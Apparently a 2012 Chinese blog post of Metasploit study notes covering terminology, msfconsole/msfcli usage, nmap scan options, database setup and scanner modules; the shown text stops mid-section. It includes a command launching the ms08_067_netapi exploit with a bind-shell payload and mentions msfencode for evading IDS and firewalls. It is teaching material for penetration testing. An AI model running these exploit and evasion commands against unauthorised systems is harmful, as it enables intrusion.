<!doctype html>
<html lang="zh-Hans" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">metasploit学习笔记 | 老司机的文档集</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="metasploit学习笔记 | 老司机的文档集"><meta data-rh="true" name="description" content="msf study note"><meta data-rh="true" property="og:description" content="msf study note"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2012-11-12T00:00:00.000Z"><meta data-rh="true" property="article:tag" content="msf,security"><link data-rh="true" rel="icon" href="/notes/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note"><link data-rh="true" rel="alternate" href="https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note","url":"https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note","headline":"metasploit学习笔记","name":"metasploit学习笔记","description":"msf study note","datePublished":"2012-11-12T00:00:00.000Z","author":[],"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://itxx00.github.io/notes/blog","name":"Blog"}}</script><link rel="alternate" type="application/rss+xml" href="/notes/blog/rss.xml" title="老司机的文档集 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/notes/blog/atom.xml" title="老司机的文档集 Atom Feed"><link rel="stylesheet" href="/notes/assets/css/styles.6ec35f4b.css">
<script src="/notes/assets/js/runtime~main.0e95b8be.js" defer="defer"></script>
<script src="/notes/assets/js/main.82b9e97c.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/notes/"><div class="navbar__logo"><img src="https://github.com/itxx00.png" alt="老司机" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="https://github.com/itxx00.png" alt="老司机" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">老司机</b></a><a class="navbar__item navbar__link" href="/notes/docs/intro">教程</a><a class="navbar__item navbar__link" href="/notes/blog/archive/">历史博文</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/notes/blog">博客</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/itxx00/notes" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="最近博文导航"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2025/08/07/k8s-basic">k8s基础知识总结</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2023</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2023/12/25/create-loop-lvm">如何通过loop模拟一个lvm逻辑卷</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2023/02/02/non-root-systemd">普通用户执行systemctl启停服务禁用密码认证</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2022</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/12/28/influxdb-ql-use-case">influxQL常用语句整理</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/11/08/static-build-jq-fio">mac上使用docker交叉静态编译jq和fio</a></li></ul></div></nav></aside><main class="col col--7"><article class=""><header><h1 class="title_f1Hy">metasploit学习笔记</h1><div class="container_mt6G margin-vert--md"><time datetime="2012-11-12T00:00:00.000Z">2012年11月12日</time> · <!-- -->阅读需 34 分钟</div></header><div id="__blog-post-container" class="markdown"><blockquote>
<p>N年前使用metasploit框架过程中写下的学习笔记</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="一名词解释">一．名词解释<a href="#一名词解释" class="hash-link" aria-label="一．名词解释的直接链接" title="一．名词解释的直接链接">​</a></h2>
<ul>
<li>
<p>exploit: 测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的 有内存溢出，网站程序漏洞利用，配置错误exploit。</p>
</li>
<li>
<p>payload: 我们想让被攻击系统执行的程序，如reverse shell可以从目标机器与测试者之间建立一 个反响连接，bind shell 绑定一个执行命令的通道至测试者的机器。payload也可以是只 能在目标机器上执行有限命令的程序。</p>
</li>
<li>
<p>shellcode: 是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可 执行命令的shell。</p>
</li>
<li>
<p>module: MSF的模块，由一系列代码组成。</p>
</li>
<li>
<p>listener: 等待来自被攻击机器的incoming连接的监听在测试者机器上的程序。</p>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="二msf基础">二．MSF基础<a href="#二msf基础" class="hash-link" aria-label="二．MSF基础的直接链接" title="二．MSF基础的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动msf">启动msf<a href="#启动msf" class="hash-link" aria-label="启动msf的直接链接" title="启动msf的直接链接">​</a></h3>
<p>1、MSF提供多种用户界面：控制台模式（msfconsole），命令行模式（msfcli），图形模式（msfgui、armitage），（在老版本中还有web界面模式，后来貌似由于安全因素被取消了？）其中console模式最常用，启动方式：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/framework/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span></code></pre></div></div>
<p>运行此命令后将进入msf命令提示符：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="获取帮助信息">获取帮助信息<a href="#获取帮助信息" class="hash-link" aria-label="获取帮助信息的直接链接" title="获取帮助信息的直接链接">​</a></h3>
<p>2、获取命令的帮助信息：help</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">help connect</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfcli">msfcli<a href="#msfcli" class="hash-link" aria-label="msfcli的直接链接" title="msfcli的直接链接">​</a></h3>
<p>3、msfcli 和msfconsole相比不提供交互方式，它直接从命令行输入所有参数并产生结果，</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli –h #获取帮助信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli &lt;exploit_name&gt; &lt;option=value&gt; [mode]</span><br></span></code></pre></div></div>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mode:H（help）帮助</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   S（summary）显示模块信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    O（options）显示模块的可用选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     A（advanced）显示高级选项   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I（ids）显示IDS EVASION 选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     P（payload）显示此模块可用的payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">T（targets）显示可用targets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AC（action）显示可用actions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C（check）运行模块测试</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   E（execute）执行选定的模块</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="模块使用示例">模块使用示例<a href="#模块使用示例" class="hash-link" aria-label="模块使用示例的直接链接" title="模块使用示例的直接链接">​</a></h3>
<p>例子：ms08_067_netapi模块</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi O    #查看可用选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 P #查看可用payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 PAYLOAD=windows/shell/bind_tcp E   #执行 （此处O、P 等参数也可以用小写）</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="armitage使用">armitage使用<a href="#armitage使用" class="hash-link" aria-label="armitage使用的直接链接" title="armitage使用的直接链接">​</a></h3>
<p>4、Armitage <!-- -->:MSF<!-- -->的一个图形接口</p>
<p>运行方式：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/farmework/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">armitage</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msf其他组件">msf 其他组件<a href="#msf其他组件" class="hash-link" aria-label="msf其他组件的直接链接" title="msf其他组件的直接链接">​</a></h3>
<p>5、MSF其他组件：</p>
<ul>
<li>MSFpayload工具：</li>
</ul>
<p>用于生成shellcode，可生成C,Ruby，JaveScript，VB格式的shellcode。
帮助信息：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload –h</span><br></span></code></pre></div></div>
<ul>
<li>MSFencode工具：</li>
</ul>
<p>编码压缩shellcode，过IDS ,防火墙。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfencode -h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="三信息刺探与收集">三．信息刺探与收集<a href="#三信息刺探与收集" class="hash-link" aria-label="三．信息刺探与收集的直接链接" title="三．信息刺探与收集的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1攻击第一步基础信息收集">1、攻击第一步：基础信息收集<a href="#1攻击第一步基础信息收集" class="hash-link" aria-label="1、攻击第一步：基础信息收集的直  接链接" title="1、攻击第一步：基础信息收集的直接链接">​</a></h3>
<p>whois查询：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf &gt; whois example.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; whois 192.168.1.100</span><br></span></code></pre></div></div>
<p><a href="http://searchdns.netcraft.com/%E5%9C%A8%E7%BA%BF%E6%94%B6%E9%9B%86%E6%9C%8D%E5%8A%A1%E5%99%A8IP%E4%BF%A1%E6%81%AF%E5%B7%A5%E5%85%B7" target="_blank" rel="noopener noreferrer">http://searchdns.netcraft.com/在线收集服务器IP信息工具</a></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nslookup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set type=mx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; example.com</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2用nmap探测开放端口和服务">2、用nmap探测开放端口和服务：<a href="#2用nmap探测开放端口和服务" class="hash-link" aria-label="2、用nmap探测开放端口和服务：的直接链接" title="2、用nmap探测开放端口和服务：的直接链接">​</a></h3>
<p>-sS SYN半开扫描  -sT TCP 半开扫描 -Pn 不使用ping 方式探测主 机  -A 探测服务类型 -6 开启IPV6扫描  -O 探测操作系统版本
常用扫描参数组合：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn 192.168.0.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn –A 192.168.0.111 </span><br></span></code></pre></div></div>
<p>其他组合：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -A -v 深入式扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sU -T4 -A -v 同上，且扫UDP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -p 1-65535 -T4 -A -v  扫描所有TCP端口</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -A -v -Pn 不使用ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sn 使用ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -F 快速扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -T4 -O -F --version-light 加强版快速扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sn --traceroute 快速路由跟踪扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; 慢速全面扫描</span><br></span></code></pre></div></div>
<p>（nmap的scripts位于/usr/local/share/nmap/scripts/目录，用LUA语言编写，nmap --script-help all | less 查看脚本扫描帮助信息）
（nmap还有一个GUI界面工具叫zenmap，命令zenmap或nmapfe都可以启动）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3msf与postgresql协同工作">3、MSF与postgresql协同工作<a href="#3msf与postgresql协同工作" class="hash-link" aria-label="3、MSF与postgresql协同工作的直接链接" title="3、MSF与postgresql协同工作的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/init.d/postgreql-8.3 start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 导入nmap扫描的结果：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24   # -oX 扫描结果导出为Subnet1.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_import Subnet1.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_hosts –c address   #查看导入的主机IP </span><br></span></code></pre></div></div>
<p>msf也可以和mysql一起工作，在bt5 r1中msf默认支持连接mysql：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_driver mysql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect root:toor@127.0.0.1/msf3 #连接本机mysql的msf3数据库</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql默认密码toor，使用db_connect连接时会自动创建msf3库）</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4高级扫描方式">4、高级扫描方式：<a href="#4高级扫描方式" class="hash-link" aria-label="4、高级扫描方式：的直接链接" title="4、高级扫描方式：的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ip/ipidseq   #IPID序列扫描器，与nmap的-sI -O选项类似</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>（RHOSTS、RPORT等参数也可以用小写）</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –PN –sI 192.168.1.09 192.168.1.155</span><br></span></code></pre></div></div>
<p>nmap 连接数据库：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_nmap –sS –A 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_services  #查看扫描结果</span><br></span></code></pre></div></div>
<p>使用portscan模块：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search postscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use scanner/postscan/syn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5特定扫描">5、特定扫描：<a href="#5特定扫描" class="hash-link" aria-label="5、特定扫描：的直接链接" title="5、特定扫描：的直接链接">​</a></h3>
<p>smb_version模块：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smb/smb_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,os_flavor</span><br></span></code></pre></div></div>
<p>查找mssql主机：</p>
